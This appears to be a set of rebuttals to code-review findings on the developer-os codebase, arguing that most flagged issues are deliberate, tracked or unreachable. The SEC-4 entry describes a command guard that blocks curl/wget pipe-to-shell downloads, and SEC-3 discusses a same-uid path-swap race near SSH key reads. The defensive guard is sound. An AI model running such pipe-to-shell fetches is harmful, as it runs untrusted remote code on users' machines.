- CLI-CMD-6: `review --decision accept` is not refused inside an agent session, although the same product refuses `brain retire`/`refactor` there. Agent-driven review is the shipped design. The product renders a developer-os-review skill for agents (plugins/claude/skills/developer-os-review/SKILL.md, generated from workflows/review/workflow.yaml) whose 'decide' step runs `developer-os review` with {"decision":"$input.decision"}, the decision the user supplied. Refusing review when an agent marker is set would break this intended workflow. The human gate is the user's decision relayed through the skill, not a process-level check. The agent-marker refusal on refactor/retire is a separate, deliberate choice for structural vault edits.
- CLI-LIFE-3: Hook argv grammar and verb/vendor types are re-declared instead of reusing the core hook contract that renders them. The premise 'nothing links the two' is false. apps/cli/src/hooks/contract-parity.test.ts pins the CLI copy to core: `expect([...HOOK_GUARD_KINDS]).toStrictEqual([...CORE_HOOK_GUARD_KINDS])`. It also checks the rendered Claude and Codex rows against the runtime's HOOK_EVENT_OF and HOOK_TOOL_MATCHERS. So the duplication is deliberate and guarded by a test, and a drift in guard kinds would fail it. The rest of the claim (the argv token-sequence round-trip) is a test-coverage nicety. It is not material duplication.
- CORE-UPD-2: release.ts compareSemver duplicates versions/compareVersions, and the two grammars differ. compareSemver (release.ts:229) only runs on parseStableSemver-branded inputs, whose components are at most 2^32-1, so Number arithmetic is exact and correct. compareVersions (versions/index.ts:45) belongs to a different domain (vendor capability tables), has a nullable fail-closed API and its own parseVersion grammar. A grammar difference between two unrelated domains causes no wrong behavior. This is not material duplication.
- CORE-REST-6: Core barrel re-exports many symbols with zero consumers outside core. The evidence is partly wrong. Some listed names have cross-package consumers: HookExecutablePathError (adapter-claude and adapter-codex hooks tests), publishableConfig (cli config.v2.test.ts) and buildGitTree (cli git.v2.test.ts). @developer-os/core is private, so those tests can only reach the names through the barrel. index.test.ts is a deliberate 'door test' that pins a curated public surface by design, and error classes are exported for instanceof checks. Even the genuinely unreferenced constants amount to speculative surface trimming, not a material defect.
- CORE-REST-7: Transaction plans and journals dedupe targets by exact path while manifests and change plans dedupe by folded path. The cited line is wrong: validatePlan is at executor.ts:2263-2324, not 2559. The exact-string Set is real, but the finding shows no producer that emits two case-variant targets. Executor plans come from internal planners such as instructions/apply, update, uninstall and init, which build canonical, distinct vendor paths, and the finding itself concedes the validateChangePlan callers are protected. This is an unreachable defence-in-depth suggestion, not a demonstrated bug.
- BRAIN-2: Garden recovers the gap tag by regex-parsing lint's human message, which screens and caps the tag. This is intentional and documented at the cited site. select.ts:33-39 says: "Controller ruling 2: gap targets are derived from notes; a lint gap finding only confirms a tag, and only when the tag is recoverable from its message. Lint screens and caps the tag it prints, so a tag carrying a control character or an overlong name never matches and is not selected — fewer targets, never a wrong one." The finding restates this designed fail-closed behaviour as a bug.
- BRAIN-4: rename, move and merge never rewrite `sources:` citations, so they refuse with a generic post-condition error where retire gives an explanation. This is a documented, intentional constraint. docs/architecture/brain.md:444-447 says: "A note another note cites in `sources` cannot be renamed, moved or merged. No frontmatter is ever edited ... the refactor's post-condition refuses it with refactor_postcondition_failed. It is fail-closed." plan.test.ts:87-96 pins exactly this (rename of a cited note rejects with reason refactor_postcondition_failed, paths ["DEV/a.md"]), so the refusal also names the citing note.
- BRAIN-7: Discovery's `isExcludedSegment` is reimplemented four times, with different normalization, and one comment names the wrong module. Each restatement is a documented, deliberate split. migrations/update/plan.ts:11-15 says BRAIN_MIGRATION_PRIVATE_FOLDERS is restated "because importing discovery would pull Security's filesystem canonicalization into the target planner's capability-absence graph. A test pins the two lists equal", so the claim that the list would not follow PRIVATE_FOLDERS is wrong. ingest/validate.ts:615-627 explains why excludedSegment (exact case) and excludedSegmentLoosely (folded) are deliberately separate, and garden's isPrivate folds for the documented volume-folding reason. All copies import the shared PRIVATE_FOLDERS. The only residue is an imprecise comment at garden/validate.ts:67, which is a nit.
- BRAIN-8: `planBrainSchemaMigrations` and its helpers have no production caller; two parallel empty migration registries exist. This is intentional scaffolding for parked, tracked work. BRAIN_MIGRATIONS staying empty is founder decision D4 (BACKLOG.md:144, completion-roadmap D4), and brain.md:237 records it. planBrainSchemaMigrations and BRAIN_UPDATE_MIGRATIONS are the Brain half of the update-planner protocol (core planSchemaMigrations). Its wiring belongs to Task 11b, which BACKLOG NEW-111 tracks as owning "the packed planner and verifier binaries". isBrainMigrationPath from the same module is already wired in production (apps/cli/src/update/context.ts:313). Pending infrastructure tracked under NEW-111 is not dead code to remove.
- SEC-3: readText's dev/ino check compares two lookups of the same path, so it misses an ancestor swapped after the policy check. The attack needs a same-uid process that can already rewrite the victim's directories and read ~/.ssh directly, so the product gains no privilege it did not already have. The threat model states same-uid residuals elsewhere (threat-model.md:763, 897). Line 817 (§5.12, which covers config.toml reads) describes the mechanism accurately ('canonicalizes, refuses a protected name, opens O_NOFOLLOW and re-checks dev/ino') and does not claim protection against ancestor swaps. The doc does not overstate what the code does, and there is no reachable boundary violation.
- SEC-4: assertSafeCommand's curl/wget pipe-to-shell branch cannot fire in production, yet a security suite treats it as the guard. The curl/wget branch at process.ts:67-78 is a deliberate defence-in-depth guard. Both runners call it, including supervised validateRequest at supervised-process.ts:95. tests/security/multiline-command.test.ts pins it on purpose and says why: to assert the guard on the capture path 'rather than assuming it' (SEC-100). That header is accurate, because assertSafeCommand does normalize newlines for that spawn shape. A security check that no current caller triggers is not dead code to remove. Security measures should not be simplified away, and the test that pins it can fail if the branch breaks.
- MACOS-1: Two incompatible 'trusted executable' policies: platform assertTrustedExecutable vs cli admitOwnedExecutable. The divergence is deliberate and documented. docs/architecture/threat-model.md:750-756 says capture's admitOwnedExecutable (D72 Q2-A, NEW-46) requires owner-execute and no setuid/setgid/sticky, and is 'stricter than `assertTrustedExecutable`, which accepts a group-writable directory the user owns'. capture.ts:233-249 also explains why capture uses a pinned, stricter rule. The remaining same-uid residual is tracked as NEW-121, and the policy question is NEW-33.
- ADAPT-1: FD 3 write failure orphans the spawned child and drops its exit status. The quoted code was apps/launcher/src/handoff.ts (fixed by removal: Task 11b Task 12, `6269550f`, deleted the FD 3 write, 2026-10-07), but the defect is already tracked. docs/superpowers/BACKLOG.md §Phase 4b · A11 (lines 209-213, 'phase 4b review M3, deferred') says: 'an EPIPE on the FD 3 trust write throws before `await exit` and discards the child's real exit code (no deterministic test found yet)'. The same note covers the missing signal forwarding to the child. The finding also says itself that the path cannot be reached today: main.ts:47 sets LAUNCHER_OFFLINE_RELEASE_ROOTS = [], so trust is null and no FD 3 pipe is opened. Wiring real roots belongs to NEW-111 / Task 11b. The orphan and unhandled-rejection details are refinements of the same tracked root cause, not new evidence.
- ADAPT-2: DEFAULT_TIMEOUT_MS and invocationFromAgentPrompt have no production caller; ingest uses its own timeout path. This is a deliberate test-pinned API, not dead code. docs/architecture/codex-adapter.md:672-682 (NEW-106, D73) documents invocationFromAgentPrompt as the contract door for a future workflow agent.prompt caller and states it is 'exercised only by tests'. apps/cli/src/commands/ingest.test.ts:3142-3160 uses it to pin D73 isolation: an agent.prompt Codex call runs in its own home. packages/adapter-codex/src/index.test.ts:57 pins it as a public export. DEFAULT_TIMEOUT_MS is its documented default (invoke.ts:72-80). ingest's separate timeout is a different, documented path (invokeIsolatedCodex), not a contradiction. Removing either symbol would break tests that pin a recorded decision.
- SCHEMA-4: isKnownVerb is exported with no production caller. isKnownVerb is part of the package's pinned public export surface. packages/workflow-schema/src/index.test.ts:44 lists it in the export set that test asserts, so the API is deliberate and test-pinned, not orphaned. The vocabulary.ts:132 comment records history: before the fix, both consumers indexed the table directly. It does not mark the function as dead. The function is a one-line wrapper over lookupVerb and costs nothing. The finding itself says to leave the cli.run and agent.prompt entries alone (implemented: false). Under the rules, an intended test-pinned API counts as refuted.
- TEST-2: Claude and Codex plugin-load cases skip silently in CI; only the vendor-ingest job discloses this. The skip in CI is a documented design decision. tests/integration/claude/plugin-loads.test.ts:19-23 reads: 'A machine without Claude Code must still pass `npm run check` — a test that fails there converts "not installed" into "broken", and CI runs on a runner that has no agent at all.' The suggested fix, failing when CI has no binary, would reverse that stated decision. Real-agent observation on both vendors is tracked as founder stop points in NEW-127 (Claude) and NEW-104 (Codex). check.yml (around lines 411-421) already says that vendor runs on hosted runners are not evidence. The finding adds no new evidence beyond those rows.
- FLOW-UNINST-5: uninstall's absent-manifest refusal tells the user to run uninstall. This is intentional. Founder decision D27 (docs/superpowers/plans/2026-09-04-developer-os-completion-roadmap.md:98) says that after a V1 uninstall, a home with leftover V1 Foundation residue 'refuses with exit 6 and D20's archive guidance'. foundation.md:1157 states the same for the absent-manifest arms, and the constant's own doc comment (absent-manifest-uninstall.ts:39) says 'D20: the one way out of Foundation residue no absent-manifest arm may remove'. Tests pin the archive guidance (uninstall.test.ts:485, :564). The wording is a documented decision, not a defect.
- W2-BOOT-C-6: open() builds the initial journal before checking that the fallback applies, so a later failure can hide the real selection error. buildInitialJournal, timestamp and validateInitialSelection (journal-store.ts:358-377, 470-476) depend only on the already-admitted plan and the clock, never on slot contents. For a plan that passed validatePlan and validatePlanContract a few lines above, none of them fails because of the envelope, so the masking needs a broken clock or a callback defect. The order costs some extra work on the refusal path, but that is cheap and not material.
- W2-ROLLBACK-3: Inventory-derived retirement set and its documented order are unused, and production never checks manifest partition == payload inventory. The spec §3.2 rule (lines 489-490) says inventories 'do not independently grant deletion authority: each removal set must equal its relevant manifest partition'. Production meets it by construction: retirement-resolve.ts takes the removal set from the hash-bound transitional manifest partition, and compose's leafCount (compose.ts:1024/1604) counts the same rows. A missing or extra on-disk file fails directory removal rather than deleting the wrong thing. The docstring at rollback.ts:788-793 describes the function's own output, not production's order, and retirement-resolve.ts documents that the manifest is the authority, so the docstring has not drifted. The remaining point, that rollbackPayloadRetirementLeaves/Ref are referenced only by the barrel, the export-list test and unit tests, is the test-only-public-export class already reported as CORE-UPD-5.
- W2-CONSTR-4: Rollback migration accepts mode-0700 restore and current payloads that forward materialization refuses. The asymmetry is intentional. Forward payloads are planner-output blobs, which are always staged at 0600. On rollback, the `current` rows are guarded preimages of the live file: compose.ts:942 stages them with `mode: modeOf(observed)`, keeping the observed mode on disk. The restore rows likewise come from retained blobs. checkMutationPayload accepts 0600 or 0700 so that compensation can put back the file's real mode. The proposed fix (reject 448) would refuse rollback of any 0700 subject. It does not fix a real defect.
- W2-BUNDLE-4: Bundle metadata tombstonePath is validated but never read, and its rule differs from the state participant's. tombstonePath is part of a shape the spec requires. The docstring at bundle-participant.ts:165-168 says this type mirrors Spec 2 §9.2's CanonicalStateFilePlanV1 byte for byte, and the release-update spec lists tombstonePath at lines 1035/1937/3487. Removing it is not an option without changing the spec. bundle-publication compensates by inode identity (lines 368-370), so the field is intentionally inert. participants.ts:873's sibling rule governs generic state plans, not bundle metadata, and no code checks one plan against both rules. That makes the 'contradictory rules' claim unreachable. No behavior is wrong, and the finding itself gives removal_confidence low.
- W2-BUNDLE-6: buildPreparedUpdateCandidate checks only the output blob count against the transcript bounds and never ties the materialization to the preview. The finding concedes that this is not reachable. The only caller, planner.ts:1248, builds the preview and the materialization from the same admitted draft, and upstream guards already enforce the bounds the finding asks for. planner.ts:848-849 refuses an output blob count or byte sum above PLANNER_WIRE_BOUNDS_V1, and buildPreparedUpdateMaterialization caps the aggregate at preview.ts:485. The second sentence of the docstring (preview.ts:571-572) states exactly what the function checks: a self-consistent preview, plus the transcript's protocol and bounds. No input can produce wrong output.
- W2-PLANNER-4: Whole-transcript wire helpers and CANONICAL_STATE_TRANSITIONS have no production consumer. The code comment at planner.ts:1129 declares the purpose: "for tests and the target side's small helpers". The target-side packed planner is explicitly owed by Task 11b (NEW-111), so these are intentional pre-built exports for a tracked, pending consumer, not dead code. The finding's own fix says to keep them until Task 11b, with removal_confidence low, so nothing is actionable now. plannerBlobSetHash has a non-test-file consumer (apps/cli/src/update/testing.ts:694/696/911/913), though that is a fixture module. CANONICAL_STATE_TRANSITIONS backs the CanonicalStateTransitionV1 type (participants.ts:817), so removing it means inlining it, not deleting it; that is trivial style, not a material finding.
- W2-PLANNING-3: Unsigned-local home reaches the network before it is refused. The planUpdate docblock (planning.ts:572-576) says the home gates first, then FD 3 trust, then the network, and the code follows that order. The docblock never claims that unsigned-local trust is refused before the network. The network step only fetches public signed metadata and writes nothing, so it carries no security or durability impact. The path is also unreachable in production today: LAUNCHER_OFFLINE_RELEASE_ROOTS = [] (apps/launcher/src/main.ts:47, D46), so no admissible FD 3 offline trust exists, and readOfflineTrust refuses before createTransport. That gap is already tracked under NEW-111 and NEW-112. A wasted fetch on a home that will refuse anyway is not a material finding.
- W2-PLANNING-5: Exit-code classification of selectRelease relies on matching substrings of error messages. The substring matching at planning.ts:288-289 is real. The claimed failure mode is that a reworded Core label would change behavior silently, and that does not hold. planning.test.ts:131-132 pins both cases: 'a version the index does not carry' → update_release_not_found, and 'a downgrade' → update_downgrade_refused, each with exit invalidInput. A reworded label would turn those tests red, so nothing changes silently. What remains is a matter of style (typed errors would be cleaner), not a material defect.
- W2-SEC-UPD-4: Verifier request frame screens caller-supplied `snapshot: unknown` with the `path` scope, which disables high-entropy detection. Not a current defect. The only production caller (apps/cli/src/update/apply-ports.ts:775-781) passes a snapshot of three lowercase hex digests. That is why the `path` scope is needed: the high-entropy heuristic would flag 64-hex hashes, and the comment at verifier-process.ts:117 is accurate today. The risk exists only after the real home snapshot replaces the digest echo, and BACKLOG NEW-118(4) already tracks that work ('with the real verifier (Task 11b, A16)'). Treat it as a note for NEW-118(4), not a separate finding.
- W2-GAP-STATE-4: Session injection compares a folded project slug with a raw note title. The exact match is the documented contract, not a defect. hooks.md:410-411 says: 'The slug is slugify(basename(<project root>)). BrainService.sessionContext returns vault-map.md and the one project-note whose title or alias equals the slug.' The service.ts:277-281 docstring states the same rule. The alias mechanism exists for this purpose, and the note template carries `aliases: []`. At most there is a user-facing docs gap: the template and example project note do not tell users to add the slug as an alias. The cwd-vs-root slug mismatch is already tracked as FLOW-INIT-7.
